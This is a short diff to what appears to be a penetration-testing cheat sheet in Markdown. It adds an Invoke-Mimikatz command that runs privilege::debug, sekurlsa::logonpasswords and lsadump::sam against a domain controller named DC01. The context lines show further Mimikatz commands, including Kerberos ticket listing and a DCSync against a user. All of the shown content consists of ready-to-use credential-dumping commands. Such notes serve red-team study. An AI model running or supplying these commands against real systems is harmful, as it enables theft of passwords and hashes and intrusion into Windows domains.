@@ -362,6 +362,7 @@ When invoking command make sure to wrap in double AND single quotes -
 
 ```Invoke-Mimikatz -ComputerName DC01 -Command "kerberos::list"```
 
+```Invoke-Mimikatz -ComputerName DC01 -Command '"privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam"'```
 
 ```Invoke-Mimikatz -Command '"lsadump::dcsync /user:Bob"'```
 
